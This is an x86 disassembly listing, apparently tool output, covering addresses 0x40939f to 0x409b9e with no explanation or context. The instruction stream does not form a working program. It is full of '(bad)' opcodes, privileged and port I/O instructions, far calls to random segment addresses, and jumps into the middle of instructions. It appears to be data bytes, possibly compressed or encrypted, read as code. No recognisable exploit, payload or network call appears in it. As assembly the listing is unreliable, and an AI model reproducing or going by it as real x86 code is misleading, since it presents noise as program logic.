  40939f:	mov    ebp,0xe4ad109
  4093a4:	jmp    0x4093e9
  4093a6:	and    eax,0x76f664d5
  4093ab:	addr16 pushf 
  4093ad:	les    esi,FWORD PTR [ecx+0x34]
  4093b0:	add    edx,DWORD PTR [ecx]
  4093b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093b3:	outs   dx,DWORD PTR ds:[esi]
  4093b4:	ror    BYTE PTR [edx-0x37f9bfd2],0x79
  4093bb:	shl    DWORD PTR [esi-0x35a8a440],cl
  4093c1:	in     eax,0x8b
  4093c3:	in     eax,0xe4
  4093c5:	cwde   
  4093c6:	and    esp,DWORD PTR [esi]
  4093c8:	jge    0x40940b
  4093ca:	mov    al,0x78
  4093cc:	and    DWORD PTR ds:0x5d3fb745,ebp
  4093d2:	jecxz  0x409369
  4093d4:	jmp    0x9db2:0x20131145
  4093db:	lods   eax,DWORD PTR ds:[esi]
  4093dc:	call   0x347d:0x973bad24
  4093e3:	inc    ebx
  4093e4:	jo     0x40938c
  4093e6:	div    DWORD PTR [edx+0x60b95047]
  4093ec:	jge    0x40946a
  4093ee:	hlt    
  4093ef:	loopne 0x4093af
  4093f1:	enter  0xfbb4,0x46
  4093f5:	js     0x409389
  4093f7:	push   edi
  4093f8:	mov    bl,0x9f
  4093fa:	cmp    ebx,eax
  4093fc:	ret    
  4093fd:	popf   
  4093fe:	add    al,0xf4
  409400:	repnz and DWORD PTR [edx],edx
  409403:	jns    0x409444
  409405:	fsubr  st,st(5)
  409407:	push   edx
  409408:	retf   
  409409:	out    dx,al
  40940a:	call   0xd782ae02
  40940f:	repz sub ecx,DWORD PTR [ebx]
  409412:	ja     0x4093ca
  409414:	(bad)  
  409415:	xlat   BYTE PTR ds:[ebx]
  409416:	and    BYTE PTR [edi+0x48],ah
  409419:	addr16 repz inc ecx
  40941c:	in     al,dx
  40941d:	jmp    0xabaa92df
  409422:	leave  
  409423:	aad    0x78
  409425:	mov    eax,ds:0xd6adc9d0
  40942a:	ins    BYTE PTR es:[edi],dx
  40942b:	gs add ebp,ecx
  40942e:	jae    0x40941e
  409430:	adc    edi,DWORD PTR [esi-0x59]
  409433:	faddp  st(4),st
  409435:	out    0x38,eax
  409437:	mov    ?,WORD PTR [ebx+0x5766e4e]
  40943d:	inc    esi
  40943e:	jne    0x40944c
  409440:	dec    ebp
  409441:	sti    
  409442:	lds    ebp,FWORD PTR [ecx+0x1d859aca]
  409448:	sbb    eax,DWORD PTR [edi-0x66f639cc]
  40944e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40944f:	cs adc ax,0x1074
  409454:	lahf   
  409455:	imul   edi,esi,0x5f
  409458:	pop    esp
  409459:	and    al,0xec
  40945b:	(bad)  
  40945c:	loopne 0x409493
  40945e:	adc    ebp,DWORD PTR [edx+0x3ed5122b]
  409464:	xchg   edx,eax
  409465:	or     al,0x6d
  409467:	or     edi,ecx
  409469:	iret   
  40946a:	mov    edi,DWORD PTR es:[ebx+0x79]
  40946e:	(bad)  
  40946f:	data16 xor al,0xd5
  409472:	xor    bl,bh
  409474:	sub    ch,BYTE PTR [ebx-0x59]
  409477:	mov    BYTE PTR [eax],ah
  409479:	test   al,0x54
  40947b:	dec    ebx
  40947c:	in     eax,0xaf
  40947e:	add    esi,DWORD PTR [ebx+0x664a2179]
  409484:	xchg   edx,eax
  409485:	fidivr DWORD PTR [ebx-0x1c7fe2c1]
  40948b:	scas   eax,DWORD PTR es:[edi]
  40948c:	xor    eax,0x4e6fa84e
  409491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409492:	mov    ebp,DWORD PTR [esi+0x1d]
  409495:	adc    esp,ecx
  409497:	xchg   esi,eax
  409498:	sbb    al,0x84
  40949a:	xchg   ebp,eax
  40949b:	mov    ds:0x1e5842c2,eax
  4094a0:	leave  
  4094a1:	and    eax,0x76a8c46d
  4094a6:	shl    edx,1
  4094a8:	sub    DWORD PTR [esi],ecx
  4094aa:	or     eax,0x93331dd6
  4094af:	pop    ds
  4094b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094b1:	push   es
  4094b2:	xchg   esp,eax
  4094b3:	scas   al,BYTE PTR es:[edi]
  4094b4:	push   ebp
  4094b5:	pop    eax
  4094b6:	enter  0x9584,0xb5
  4094ba:	div    DWORD PTR [eax+0x20]
  4094bd:	add    al,0x51
  4094bf:	xchg   esi,eax
  4094c0:	push   ds
  4094c1:	dec    ebx
  4094c2:	shl    ah,0x46
  4094c5:	cmp    esi,DWORD PTR [esi+0x5362e88a]
  4094cb:	cmp    BYTE PTR [ecx-0x50],0x86
  4094cf:	lods   al,BYTE PTR ds:[esi]
  4094d0:	xlat   BYTE PTR ds:[ebx]
  4094d1:	push   cs
  4094d2:	test   BYTE PTR [eax],al
  4094d4:	mov    ecx,0x64b5119b
  4094d9:	adc    eax,esi
  4094db:	aas    
  4094dc:	adc    ebp,esi
  4094de:	sbb    bh,BYTE PTR [ebp+ecx*4+0x1e]
  4094e2:	jbe    0x40947b
  4094e4:	mov    dh,0x92
  4094e6:	pop    ds
  4094e7:	xor    al,dl
  4094e9:	inc    edi
  4094ea:	in     eax,dx
  4094eb:	mov    ds,WORD PTR [eax+0x7d664117]
  4094f1:	push   ds
  4094f2:	sar    DWORD PTR [ebp+edx*2-0x3],1
  4094f6:	inc    esp
  4094f7:	call   0x680b:0x51937519
  4094fe:	sar    BYTE PTR ss:[edi-0x666d7406],0x46
  409506:	pshufw mm7,QWORD PTR [esi],0x92
  40950a:	jge    0x409541
  40950c:	cmp    al,0x3b
  40950e:	mov    ds:0xab726638,eax
  409513:	leave  
  409514:	inc    edx
  409515:	fs jp  0x409530
  409518:	fiadd  WORD PTR [ebx+0x5]
  40951b:	add    bh,BYTE PTR [eax+0xc5b08ad]
  409521:	mov    bl,dl
  409523:	fild   DWORD PTR [edi-0x2318b19a]
  409529:	ror    BYTE PTR [eax+0x68],0xaf
  40952d:	push   esi
  40952e:	or     bl,BYTE PTR [ebp-0x20dbc8d1]
  409534:	push   esi
  409535:	dec    edx
  409536:	not    DWORD PTR [esi+0x0]
  409539:	in     al,dx
  40953a:	sbb    eax,0x3b59c01f
  40953f:	(bad)  
  409540:	xlat   BYTE PTR ds:[ebx]
  409541:	cld    
  409542:	js     0x409546
  409544:	mov    ecx,0xe6526a38
  409549:	fdiv   st,st(0)
  40954b:	push   edx
  40954c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40954d:	or     DWORD PTR [esi],0x7bb12b21
  409553:	in     eax,dx
  409554:	sbb    BYTE PTR [edi+0x3f5654da],0x5b
  40955b:	pop    ds
  40955c:	sub    eax,0xd13dd18a
  409561:	pop    eax
  409562:	fdivr  QWORD PTR [ebx]
  409564:	lock pop ecx
  409566:	popf   
  409567:	pop    esp
  409568:	mov    bl,0x2b
  40956a:	mov    WORD PTR [ebp+0x7d],cs
  40956d:	xchg   edi,eax
  40956e:	cmp    al,0x96
  409570:	ins    DWORD PTR es:[edi],dx
  409571:	iret   
  409572:	ret    
  409573:	mov    bh,0x6f
  409575:	pop    ds
  409576:	jae    0x40956f
  409578:	ror    cl,1
  40957a:	cmp    ch,al
  40957c:	loopne 0x40958b
  40957e:	retf   
  40957f:	inc    edx
  409580:	xchg   esp,eax
  409581:	mov    eax,0x5aa8f144
  409586:	inc    eax
  409587:	push   eax
  409588:	sbb    edx,DWORD PTR [ebp+0x1a1b177b]
  40958e:	or     BYTE PTR [esp+edi*1-0x61e0b9ea],cl
  409595:	fadd   QWORD PTR [edx+0x27cbd4fc]
  40959b:	adc    BYTE PTR [eax-0x5963fa0e],al
  4095a1:	jbe    0x40953e
  4095a3:	push   ebp
  4095a4:	fcmovnu st,st(7)
  4095a6:	mov    ah,0x1b
  4095a8:	fwait
  4095a9:	push   ecx
  4095aa:	call   0xeccf601d
  4095af:	mov    ds:0x17450a01,eax
  4095b4:	stos   DWORD PTR es:[edi],eax
  4095b5:	pop    edi
  4095b6:	sar    DWORD PTR [ecx-0x3e9fccf2],cl
  4095bc:	add    al,0x41
  4095be:	mov    DWORD PTR [edx],esi
  4095c0:	mov    bh,BYTE PTR [ecx-0x2b5f4e77]
  4095c6:	sub    eax,0x3c7440b2
  4095cb:	loop   0x409602
  4095cd:	jmp    0xc82d4470
  4095d2:	cmc    
  4095d3:	out    dx,al
  4095d4:	or     ah,BYTE PTR [esp+edx*4]
  4095d7:	xchg   ecx,eax
  4095d8:	push   esp
  4095d9:	ret    
  4095da:	fwait
  4095db:	inc    eax
  4095dc:	mov    esp,0xf27d3db6
  4095e1:	xchg   ebx,eax
  4095e2:	imul   esp,DWORD PTR [eax+0x54927874],0xb00f20be
  4095ec:	cdq    
  4095ed:	adc    DWORD PTR [eax+edi*4+0xc],edi
  4095f1:	stos   BYTE PTR es:[edi],al
  4095f2:	(bad)  
  4095f3:	and    eax,0xf4488681
  4095f8:	ret    
  4095f9:	adc    eax,0x2e7e7db8
  4095fe:	xchg   ecx,eax
  4095ff:	mov    ebp,0x59a76d03
  409604:	iret   
  409605:	lds    edx,FWORD PTR [edi]
  409607:	mov    bh,0x5e
  409609:	mov    edi,0x8d440b1
  40960e:	mov    bh,bl
  409610:	or     eax,0x253d6f63
  409615:	or     ah,BYTE PTR [eax]
  409617:	rcr    DWORD PTR ds:0xceb15ebd,0xad
  40961e:	pop    ds
  40961f:	sub    al,0xab
  409621:	pusha  
  409622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409623:	mov    ds:0x87cc09fe,eax
  409628:	pop    ebp
  409629:	(bad)  
  40962a:	and    DWORD PTR [ecx-0x6bfb40d0],esp
  409630:	addr16 mov dl,0x95
  409633:	mov    edx,esi
  409635:	rol    DWORD PTR [ebx+0x116638bf],0x76
  40963c:	lea    edi,[ebp+0x1618215c]
  409642:	repz push 0xffffffec
  409645:	stos   BYTE PTR es:[edi],al
  409646:	push   0xffffffb3
  409648:	sub    DWORD PTR [ebp-0x17],ebx
  40964b:	inc    edi
  40964c:	ds or  dl,dh
  40964f:	or     BYTE PTR [ecx+edx*4-0x7b500a60],dl
  409656:	scas   al,BYTE PTR es:[edi]
  409657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409658:	das    
  409659:	lds    eax,FWORD PTR [edx+0x6]
  40965c:	pop    ds
  40965d:	or     al,0x13
  40965f:	mov    bh,0x4c
  409661:	cmp    dl,al
  409663:	cmp    ch,BYTE PTR [edx+edx*2+0x4a9ebac]
  40966a:	dec    esp
  40966b:	rol    DWORD PTR [edx+0x6e],cl
  40966e:	xlat   BYTE PTR ds:[ebx]
  40966f:	bound  ecx,QWORD PTR gs:[ebx+0x49bfd73a]
  409676:	(bad)  
  409677:	in     al,dx
  409678:	mov    ebp,0x8bee6703
  40967d:	and    eax,0xcc93f7ee
  409682:	mov    edi,0x30d84e9f
  409687:	or     ah,cl
  409689:	ret    0x411c
  40968c:	sub    ah,bl
  40968e:	sbb    al,0x8e
  409690:	std    
  409691:	adc    ebp,edx
  409693:	push   ds
  409694:	ins    DWORD PTR es:[edi],dx
  409695:	test   DWORD PTR [ebp-0x40cd19b],eax
  40969b:	out    dx,eax
  40969c:	xchg   ebp,eax
  40969d:	cmp    DWORD PTR [esi],0x4e1da03d
  4096a3:	or     ebp,DWORD PTR [ecx+0x5770a69c]
  4096a9:	lock leave 
  4096ab:	cmp    al,ah
  4096ad:	lock out 0x40,eax
  4096b0:	cmp    al,0x6a
  4096b2:	and    DWORD PTR [eax+0x54fe2ddf],ecx
  4096b8:	mov    bl,0xfc
  4096ba:	and    DWORD PTR [ecx+0x34],eax
  4096bd:	dec    eax
  4096be:	sub    eax,0x6dc0b6b4
  4096c3:	fnstcw WORD PTR [edi]
  4096c5:	xchg   ebx,eax
  4096c6:	test   al,0xd9
  4096c8:	dec    esi
  4096c9:	aaa    
  4096ca:	pop    ds
  4096cb:	ret    0x944a
  4096ce:	lods   eax,DWORD PTR ds:[esi]
  4096cf:	cmp    eax,0xdb9698f0
  4096d4:	mov    al,0x10
  4096d6:	push   edx
  4096d7:	sbb    BYTE PTR [edi],dl
  4096d9:	ldmxcsr DWORD PTR [ebp+0x66776b87]
  4096e0:	test   BYTE PTR [eax+0x3c386ab],bl
  4096e6:	xor    edx,ebp
  4096e8:	mov    bh,0x89
  4096ea:	inc    ebx
  4096eb:	jge    0x4096ea
  4096ed:	(bad)  
  4096ee:	and    bl,BYTE PTR [edx+0x71095d70]
  4096f4:	and    ah,ch
  4096f6:	out    0x2e,eax
  4096f8:	test   BYTE PTR [edi+0x2564819c],0x22
  4096ff:	pop    ss
  409700:	mov    dh,0xd3
  409702:	ss sub al,0xe0
  409705:	mov    ebp,0xfd7206ab
  40970a:	push   esi
  40970b:	sub    bl,ah
  40970d:	es mov esp,0xc4af8e9f
  409713:	neg    DWORD PTR [eax]
  409715:	xchg   esp,eax
  409716:	mov    esp,esi
  409718:	shl    DWORD PTR [esi+ebp*1-0x200c98f3],cl
  40971f:	xor    BYTE PTR [ecx+ebp*8-0x42],bh
  409723:	(bad)
  409726:	cmp    eax,0x3ac3a468
  40972b:	test   BYTE PTR [edx+0x5c],dh
  40972e:	mov    ebp,0x5873f2ab
  409733:	idiv   BYTE PTR [esi-0x7063df14]
  409739:	fistp  QWORD PTR [esi]
  40973b:	mov    eax,0x262f21a4
  409740:	(bad)  
  409741:	mov    esi,0x9be51786
  409746:	dec    ebp
  409747:	mov    ds,WORD PTR [edx+0x4200131d]
  40974d:	and    esi,edi
  40974f:	and    BYTE PTR [ebp+0x22],0xea
  409753:	call   0x57dfc115
  409758:	mov    ebp,0x30222abc
  40975d:	popa   
  40975e:	stos   DWORD PTR es:[edi],eax
  40975f:	(bad)  
  409760:	shl    DWORD PTR [ebp+0x3f2173fa],cl
  409766:	mov    es:0x2fdaf2ae,eax
  40976c:	jge    0x4097be
  40976e:	into   
  40976f:	js     0x409789
  409771:	test   BYTE PTR [eax-0x6dccaa2c],dl
  409777:	mov    cl,0x8e
  409779:	jbe    0x409721
  40977b:	popa   
  40977c:	push   esi
  40977d:	popf   
  40977e:	adc    dh,dl
  409780:	(bad)  
  409781:	iret   
  409782:	mov    cl,0x3c
  409784:	dec    eax
  409785:	mov    esp,0xec6750fc
  40978a:	mov    al,ah
  40978c:	ss stos BYTE PTR es:[edi],al
  40978e:	jp     0x409741
  409790:	cwde   
  409791:	and    BYTE PTR [edi+0x2716a164],al
  409797:	push   cs
  409798:	jl     0x4097ca
  40979a:	into   
  40979b:	sbb    eax,0xe7507196
  4097a0:	and    DWORD PTR [ebp+edi*4-0x62],0xffffffc3
  4097a5:	mov    bl,0x12
  4097a7:	fsubr  DWORD PTR [ebx-0x6b]
  4097aa:	inc    ebx
  4097ab:	call   0x9a898bb
  4097b0:	jbe    0x409823
  4097b2:	mov    al,ds:0xcb4f1d50
  4097b7:	imul   ebp,DWORD PTR [edi-0x2ab81dc6],0xfffffff6
  4097be:	pop    edi
  4097bf:	mov    esp,cr3
  4097c2:	fld    DWORD PTR [edi-0x54]
  4097c5:	popa   
  4097c6:	jge    0x409810
  4097c8:	scas   al,BYTE PTR es:[edi]
  4097c9:	imul   edi,DWORD PTR [edi-0x42],0xea68cbfb
  4097d0:	add    DWORD PTR [ebp-0x7e8247c7],0x72
  4097d7:	neg    eax
  4097d9:	iret   
  4097da:	popf   
  4097db:	mov    al,0x2d
  4097dd:	je     0x409794
  4097df:	or     al,0xb2
  4097e1:	pop    ecx
  4097e2:	popf   
  4097e3:	cmp    ebp,ebx
  4097e5:	popf   
  4097e6:	xchg   ebx,eax
  4097e7:	add    ebx,DWORD PTR [eax]
  4097e9:	and    DWORD PTR [edx-0x1a51ab0c],0x788a2ebc
  4097f3:	pop    esp
  4097f4:	(bad)  
  4097f5:	int3   
  4097f6:	xor    BYTE PTR [edi+eax*2-0x78],bl
  4097fa:	pop    ebp
  4097fb:	push   ecx
  4097fc:	dec    eax
  4097fd:	jmp    0x4097f9
  4097ff:	pop    edi
  409800:	mov    esp,0x1ca09436
  409805:	lea    ebx,[edi]
  409807:	and    eax,0xdd77852e
  40980c:	jo     0x4097c8
  40980e:	mov    eax,0x2fb78293
  409813:	call   0x6d64:0xac20d699
  40981a:	and    al,0xd1
  40981c:	add    BYTE PTR [eax+0x708aeb0b],al
  409822:	dec    esi
  409823:	adc    al,0x8a
  409825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409826:	in     eax,0xe2
  409828:	cli    
  409829:	ins    BYTE PTR es:[edi],dx
  40982a:	in     al,dx
  40982b:	sahf   
  40982c:	add    eax,0xc803c5f8
  409831:	jmp    0x2106b946
  409836:	repz cld 
  409838:	mov    cl,0xb1
  40983a:	dec    ecx
  40983b:	dec    esp
  40983c:	clc    
  40983d:	xchg   edx,eax
  40983e:	out    0x38,al
  409840:	call   DWORD PTR [ecx-0x1547aab7]
  409846:	test   bl,ch
  409848:	and    bh,bh
  40984a:	dec    ebp
  40984b:	pop    edi
  40984c:	inc    edx
  40984d:	sub    edi,DWORD PTR [edi-0x5f]
  409850:	or     al,0x2a
  409852:	test   DWORD PTR [edi-0x4213a4ca],eax
  409858:	sbb    ebp,edi
  40985a:	push   0x2fe3a7f9
  40985f:	jmp    FWORD PTR fs:[edx+0x53]
  409863:	push   0x3b29cd6e
  409868:	test   DWORD PTR [edx+0x217c98b6],0x85852f87
  409872:	or     al,BYTE PTR [ebp-0x55]
  409875:	xchg   edx,eax
  409876:	cmp    BYTE PTR ss:[edx-0x13],cl
  40987a:	pop    esp
  40987b:	pop    edi
  40987c:	in     eax,dx
  40987d:	or     BYTE PTR [esi+0x1f],bh
  409880:	lea    esi,[edi+0x27]
  409883:	inc    ecx
  409884:	inc    ecx
  409885:	pop    ecx
  409886:	ja     0x409854
  409888:	ins    DWORD PTR es:[edi],dx
  409889:	dec    esp
  40988a:	aaa    
  40988b:	dec    edx
  40988c:	mov    edi,0x2b32e6c0
  409891:	(bad)  
  409892:	(bad)  
  409893:	outs   dx,DWORD PTR ds:[esi]
  409894:	in     al,0x1e
  409896:	retf   0x96a7
  409899:	fadd   DWORD PTR [esi-0x2b]
  40989c:	jmp    0x97d5:0xc2bb3a31
  4098a3:	xor    DWORD PTR [esi+0x2be43a86],esi
  4098a9:	push   ss
  4098aa:	loope  0x409874
  4098ac:	xchg   esi,eax
  4098ad:	and    BYTE PTR [edi+0x4aafd272],bh
  4098b3:	push   eax
  4098b4:	std    
  4098b5:	mov    eax,ds:0x33095df6
  4098ba:	sar    BYTE PTR ds:0xd34f8e83,1
  4098c0:	sar    DWORD PTR [ebp-0xf],0xf
  4098c4:	mov    bl,0xf2
  4098c6:	lods   al,BYTE PTR ds:[esi]
  4098c7:	ins    DWORD PTR es:[edi],dx
  4098c8:	adc    ebp,edi
  4098ca:	cmp    BYTE PTR [ebx-0x4e],ah
  4098cd:	in     al,0xd5
  4098cf:	into   
  4098d0:	test   al,0xc7
  4098d2:	(bad)  
  4098d3:	sbb    cl,BYTE PTR [ebx-0x2700e7ef]
  4098d9:	(bad)  
  4098da:	fidiv  DWORD PTR [ebp+0x7f784c28]
  4098e0:	aam    0x7a
  4098e2:	cmp    al,0xef
  4098e4:	ret    0x2f61
  4098e7:	call   0x3b33d7e3
  4098ec:	pop    ebx
  4098ed:	push   es
  4098ee:	xchg   edx,eax
  4098ef:	mov    esp,0xeaeb62c8
  4098f4:	xchg   edi,eax
  4098f5:	pushf  
  4098f6:	xchg   ecx,eax
  4098f7:	ins    DWORD PTR es:[edi],dx
  4098f8:	sub    eax,0x779e6ce0
  4098fd:	fisttp WORD PTR [ecx+0x3b7c25fc]
  409903:	ret    0x3543
  409906:	test   DWORD PTR [edx+ecx*1],esi
  409909:	cmp    al,0x82
  40990b:	pop    ds
  40990c:	fld    st(1)
  40990e:	mov    ebx,0x59170151
  409913:	out    0xc2,eax
  409915:	sbb    ecx,DWORD PTR [esi]
  409917:	cmp    eax,DWORD PTR [ecx]
  409919:	sub    edx,DWORD PTR [edi+0x50693eab]
  40991f:	push   esi
  409920:	aam    0x59
  409922:	mov    ds:0x11803dde,eax
  409927:	adc    ch,BYTE PTR [esi-0x3f]
  40992a:	sar    DWORD PTR [ebx-0x16993cb7],1
  409930:	mov    ah,0x27
  409932:	add    al,0xad
  409934:	pop    es
  409935:	cmp    BYTE PTR [eax-0x365a43d3],dh
  40993b:	push   esi
  40993c:	aam    0xea
  40993e:	xor    edx,esp
  409940:	in     al,dx
  409941:	mov    eax,0xf164c20b
  409946:	ss loop 0x409904
  409949:	adc    dl,BYTE PTR [esi+0x4c]
  40994c:	add    ch,al
  40994e:	xor    eax,0x3ec1d4cf
  409953:	mov    dh,0x3e
  409955:	imul   ebp,DWORD PTR [eax-0x63],0x4c12b31a
  40995c:	data16 loopne 0x409977
  40995f:	test   eax,0x971e14e
  409964:	xchg   esi,eax
  409965:	cwde   
  409966:	js     0x409904
  409968:	or     eax,0x60e012ad
  40996d:	arpl   WORD PTR [edi],cx
  40996f:	mov    edx,0x6fd5db8a
  409974:	pop    ds
  409975:	sbb    edx,eax
  409977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409978:	pop    esp
  409979:	mov    esp,0xec7f7d33
  40997e:	mov    al,0xe2
  409980:	out    dx,eax
  409981:	sub    BYTE PTR [ebx+0x2f14c9c6],al
  409987:	add    dl,BYTE PTR [edi+0x42]
  40998a:	or     BYTE PTR [ecx+0x136ec65d],bl
  409990:	mov    bh,0x96
  409992:	jmp    0x409a05
  409994:	jo     0x409918
  409996:	fs xchg ebp,eax
  409998:	mov    bl,0xf1
  40999a:	xor    al,0x31
  40999c:	inc    edi
  40999d:	mov    cs,WORD PTR [edx]
  40999f:	mov    WORD PTR [edi-0x11],cs
  4099a2:	sti    
  4099a3:	and    ah,dh
  4099a5:	ret    
  4099a6:	xchg   ebx,eax
  4099a7:	cmp    esi,DWORD PTR [ecx-0x4d]
  4099aa:	jne    0x40994d
  4099ac:	inc    eax
  4099ad:	mov    esi,0x12d86d3f
  4099b2:	xor    esp,DWORD PTR [edi]
  4099b4:	xor    al,0xa4
  4099b6:	or     ebp,DWORD PTR [eax-0x2647826b]
  4099bc:	inc    ecx
  4099bd:	cmp    BYTE PTR [eax-0x2],ah
  4099c0:	sub    al,0xa3
  4099c2:	pop    esi
  4099c3:	mov    eax,0xcf891325
  4099c8:	push   ds
  4099c9:	mov    ch,ch
  4099cb:	out    0x32,eax
  4099cd:	dec    edx
  4099ce:	in     eax,0xb1
  4099d0:	das    
  4099d1:	lods   al,BYTE PTR ds:[esi]
  4099d2:	push   ss
  4099d3:	or     al,0x8b
  4099d5:	stc    
  4099d6:	aas    
  4099d7:	cmp    BYTE PTR [ebx],dh
  4099d9:	gs pop ebp
  4099db:	jl     0x409a26
  4099dd:	aad    0x1f
  4099df:	(bad)  
  4099e0:	in     al,dx
  4099e1:	jmp    0x409a13
  4099e3:	inc    esp
  4099e4:	xor    edi,DWORD PTR [esi+0x4d]
  4099e7:	(bad)  
  4099e8:	mov    esp,0x6af5e5ec
  4099ed:	push   es
  4099ee:	imul   ebx,esi,0x25
  4099f1:	dec    ecx
  4099f2:	popf   
  4099f3:	lods   eax,DWORD PTR ds:[esi]
  4099f4:	call   0x9d77:0x99152f0e
  4099fb:	stos   DWORD PTR es:[edi],eax
  4099fc:	sbb    eax,0x8649e519
  409a01:	outs   dx,DWORD PTR ds:[esi]
  409a02:	mov    DWORD PTR [ebp+0x2e],ebp
  409a05:	les    esi,FWORD PTR [esi-0x74fa850c]
  409a0b:	out    dx,eax
  409a0c:	repnz imul bp,bx,0x3c43
  409a12:	pop    edi
  409a13:	xlat   BYTE PTR ds:[ebx]
  409a14:	mov    edx,0x8d121f44
  409a19:	mov    BYTE PTR [eax+0x4c],cl
  409a1c:	and    DWORD PTR [esi+eax*4-0x6b440153],ecx
  409a23:	jecxz  0x409a3c
  409a25:	call   0x9d8e:0x99373927
  409a2c:	lods   al,BYTE PTR ds:[esi]
  409a2d:	fisttp QWORD PTR [edx]
  409a2f:	and    BYTE PTR [edx-0x6a],dl
  409a32:	jle    0x409a7e
  409a34:	jmp    0xfa348f9e
  409a39:	mov    eax,0xeb602f25
  409a3e:	add    DWORD PTR [edx],ebx
  409a40:	inc    ecx
  409a41:	jle    0x409ab8
  409a43:	fldz   
  409a45:	pop    ds
  409a46:	dec    ebp
  409a47:	cld    
  409a48:	or     eax,0xd2d58da5
  409a4d:	cld    
  409a4e:	fcom   QWORD PTR [eax]
  409a50:	inc    esi
  409a51:	lds    esi,FWORD PTR [esi]
  409a53:	pop    ss
  409a54:	test   BYTE PTR [edi-0x56],dh
  409a57:	(bad)  
  409a58:	(bad)  
  409a59:	mov    ch,0x8c
  409a5b:	inc    ebp
  409a5c:	pusha  
  409a5d:	cld    
  409a5e:	enter  0xaa87,0xcd
  409a62:	out    0xcd,eax
  409a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a65:	and    al,0x9c
  409a67:	inc    ecx
  409a68:	rcr    BYTE PTR [ebp-0x3ac27b34],cl
  409a6e:	mov    eax,DWORD PTR [esi-0x5a]
  409a71:	xor    al,0xd9
  409a73:	(bad)  
  409a74:	and    DWORD PTR [eax-0x51],ecx
  409a77:	or     ecx,edx
  409a79:	out    0xdc,eax
  409a7b:	adc    ebp,DWORD PTR [edi-0x6a2e28f4]
  409a81:	test   al,0x4e
  409a83:	mov    eax,ds:0x22da9a56
  409a88:	xor    eax,0x71208cb3
  409a8d:	stos   BYTE PTR es:[edi],al
  409a8e:	inc    esp
  409a8f:	cmp    dl,bl
  409a91:	(bad)  
  409a92:	adc    al,0xc8
  409a94:	mov    BYTE PTR [ebp+0x4a],ah
  409a97:	stc    
  409a98:	adc    esp,edi
  409a9a:	arpl   WORD PTR [ebp-0x51],bp
  409a9d:	(bad)  
  409a9e:	or     ah,al
  409aa0:	ret    0xc06b
  409aa3:	jno    0x409a2f
  409aa5:	lock (bad) 
  409aa8:	cwde   
  409aa9:	pushf  
  409aaa:	dec    edx
  409aab:	rcl    BYTE PTR [edx-0x12d2caf2],1
  409ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab2:	dec    edi
  409ab3:	into   
  409ab4:	dec    edi
  409ab5:	jle    0x409ac5
  409ab7:	out    0x45,eax
  409ab9:	das    
  409aba:	scas   eax,DWORD PTR es:[edi]
  409abb:	ins    BYTE PTR es:[edi],dx
  409abc:	stos   DWORD PTR es:[edi],eax
  409abd:	jge    0x409afa
  409abf:	cmp    al,0x96
  409ac1:	add    al,0xdb
  409ac3:	test   DWORD PTR [ebp-0x37edf9ff],0x392988c8
  409acd:	ror    DWORD PTR [esi],1
  409acf:	lahf   
  409ad0:	test   al,0x64
  409ad2:	push   edx
  409ad3:	cvtdq2ps xmm3,XMMWORD PTR [ebx+ebx*2-0x72]
  409ad8:	gs cs pop ss
  409adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409adc:	jns    0x409b05
  409ade:	clc    
  409adf:	test   ebx,edi
  409ae1:	dec    esp
  409ae2:	pusha  
  409ae3:	push   esp
  409ae4:	repz loope 0x409b35
  409ae7:	cmc    
  409ae8:	add    eax,0x7e95ea0c
  409aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aee:	mov    ecx,0xe6f39787
  409af3:	test   eax,0x76facba
  409af8:	es stos DWORD PTR es:[edi],eax
  409afa:	cmp    eax,DWORD PTR [ebp+0x37]
  409afd:	ror    BYTE PTR [edi-0x52],cl
  409b00:	cmc    
  409b01:	jne    0x409ac3
  409b03:	aam    0x60
  409b05:	scas   eax,DWORD PTR es:[edi]
  409b06:	shufps xmm3,XMMWORD PTR [ecx],0x1c
  409b0a:	jnp    0x409ac4
  409b0c:	icebp  
  409b0d:	sar    BYTE PTR [edx-0x70],1
  409b10:	fstp   st(6)
  409b12:	iret   
  409b13:	call   0x263d804a
  409b18:	std    
  409b19:	sub    esp,DWORD PTR fs:[edx]
  409b1c:	xor    bl,bl
  409b1e:	mov    esi,0xd7e77cf6
  409b23:	cmp    BYTE PTR [edx-0x6c119bd2],dl
  409b29:	sub    edi,DWORD PTR [esp+ecx*8-0x19aaf5eb]
  409b30:	and    BYTE PTR [edx-0x20e3575d],ah
  409b36:	xchg   edx,eax
  409b37:	repnz mov WORD PTR [edx-0x74],es
  409b3b:	int    0x6e
  409b3d:	jo     0x409b32
  409b3f:	mov    eax,0x51792c70
  409b44:	mov    DWORD PTR [ecx-0x59bec395],ebx
  409b4a:	mov    eax,ds:0x62f4a017
  409b4f:	mov    cl,0x9
  409b51:	or     DWORD PTR [esi],esi
  409b53:	mov    al,ds:0x28eb968e
  409b58:	out    0xb6,al
  409b5a:	sub    eax,0x5c9c6d90
  409b5f:	pop    ecx
  409b60:	dec    esp
  409b61:	cmp    ebx,0xffffffdc
  409b64:	pop    ds
  409b65:	not    DWORD PTR [edx-0x3843523d]
  409b6b:	arpl   WORD PTR [edx],bx
  409b6d:	sbb    ecx,ecx
  409b6f:	xchg   esi,eax
  409b70:	js     0x409b4d
  409b72:	(bad)  
  409b73:	call   0xda90cec4
  409b78:	jae    0x409b39
  409b7a:	pop    ss
  409b7b:	arpl   WORD PTR [esi-0x283b871],sp
  409b81:	or     BYTE PTR [eax],al
  409b83:	addr16 test al,0xca
  409b86:	xor    dh,BYTE PTR [edx-0x1135f6f1]
  409b8c:	(bad)  
  409b8e:	popa   
  409b8f:	fwait
  409b90:	mov    esp,0x68e8522e
  409b95:	fcmove st,st(2)
  409b97:	pop    edi
  409b98:	fmul   QWORD PTR gs:[eax-0x10]
  409b9c:	shl    DWORD PTR [eax],1
  409b9e:	mov    al,ds:0x29abb71
